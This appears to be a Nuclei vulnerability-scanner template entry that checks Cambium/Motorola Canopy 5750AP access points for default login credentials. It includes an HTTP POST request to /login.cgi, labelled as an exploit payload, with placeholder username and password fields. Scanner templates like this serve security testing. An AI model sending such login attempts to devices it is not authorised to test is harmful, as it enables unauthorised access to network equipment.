# Nuclei Template: Canopy 5.7GHz Access Point - Default Login
**Template ID:** cambium-networks-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`cambium-networks-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Cambium Networks / Motorola Canopy 5750AP ADVANTAGE Access Point 5.7GHz login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login.cgi  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

&Session=0&CanopyUsername={{username}}&CanopyPassword={{password}}&login=Login&webguisubmit=submit
```

